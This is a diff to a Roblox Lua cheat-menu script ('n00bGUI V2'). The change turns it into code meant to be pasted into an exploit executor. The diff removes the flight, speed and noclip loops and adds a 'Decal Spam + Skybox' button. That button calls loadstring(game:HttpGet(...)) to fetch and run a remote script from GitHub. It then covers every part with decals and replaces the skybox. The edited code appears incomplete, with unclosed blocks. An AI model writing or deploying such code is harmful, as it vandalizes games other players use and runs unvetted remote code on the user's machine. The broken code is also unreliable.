@@ -1,5 +1,5 @@
 -- n00bGUI V2 — full, respawn-proof client script
--- Place this LocalScript in StarterPlayerScripts
+-- Paste this into a exucter
 
 local player = game.Players.LocalPlayer
 local UIS = game:GetService("UserInputService")
@@ -58,7 +58,7 @@ toggleButton.MouseButton1Click:Connect(function()
     if guiVisible then slideIn:Play() else slideOut:Play() end
 end)
 
--- Button factory (with 10% centered hover growth)
+-- Button factory
 local function createButton(text, yPos, callback)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0, 280, 0, 40)
@@ -100,7 +100,6 @@ local currentSpeed = 16
 local lowGrav = false
 local defaultGrav = workspace.Gravity
 
--- Physics movers (reused across respawns)
 local bv = Instance.new("BodyVelocity")
 bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
 bv.Velocity = Vector3.zero
@@ -110,13 +109,11 @@ bg.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
 bg.P = 1e5
 bg.D = 500
 
--- Bind to current/next character
 local function bindCharacter(char)
     character = char
     hrp = character:WaitForChild("HumanoidRootPart")
     humanoid = character:WaitForChild("Humanoid")
 
-    -- Reapply active states
     if flying then
         bv.Parent = hrp
         bg.Parent = hrp
@@ -198,51 +195,21 @@ createButton("Toggle Low Gravity", 350, function()
     workspace.Gravity = lowGrav and 50 or defaultGrav
 end)
 
---==============================
--- Runtime loops
---==============================
-RunService.RenderStepped:Connect(function()
-    if flying and hrp and humanoid then
-        local cam = workspace.CurrentCamera
-        if not cam then return end
-        local move = Vector3.zero
-        if UIS:IsKeyDown(Enum.KeyCode.W) then move += cam.CFrame.LookVector end
-        if UIS:IsKeyDown(Enum.KeyCode.S) then move -= cam.CFrame.LookVector end
-        if UIS:IsKeyDown(Enum.KeyCode.A) then move -= cam.CFrame.RightVector end
-        if UIS:IsKeyDown(Enum.KeyCode.D) then move += cam.CFrame.RightVector end
-        if UIS:IsKeyDown(Enum.KeyCode.Space) then move += Vector3.new(0, 1, 0) end
-        if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then move -= Vector3.new(0, 1, 0) end
-
-        if move.Magnitude > 0 then
-            bv.Velocity = move.Unit * 50
-        else
-            bv.Velocity = Vector3.zero
-        end
-        bg.CFrame = cam.CFrame
-    end
-end)
-
-RunService.Heartbeat:Connect(function()
-    if spinning and hrp then
-        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(1000), 0)
-    end
-    if speedGain and humanoid then
-        if humanoid.MoveDirection.Magnitude > 0 then
-            currentSpeed += 0.5
-            humanoid.WalkSpeed = currentSpeed
-        else
-            currentSpeed = 16
-            humanoid.WalkSpeed = currentSpeed
-        end
-    end
-end)
-
-RunService.Stepped:Connect(function()
-    if noclip and character then
-        for _, part in ipairs(character:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.CanCollide = false
+createButton("Decal Spam + Skybox", 400, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/HerbertV1/main/script.lua"))()
+for _, part in ipairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+            for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
+                local decal = Instance.new("Decal")
+                decal.Texture = "rbxassetid://75739531394075"
+                decal.Face = face
+                decal.Parent = part
             end
         end
     end
-end)
+
+    local sky = Instance.new("Sky")
+    sky.SkyboxBk = "rbxassetid://93809373853149"
+    sky.SkyboxDn = "rbxassetid://93809373853149"
+    sky.SkyboxFt = "rbxassetid://93809373853149"
+    sky.SkyboxLf = "rbxassetid://93809373853149"
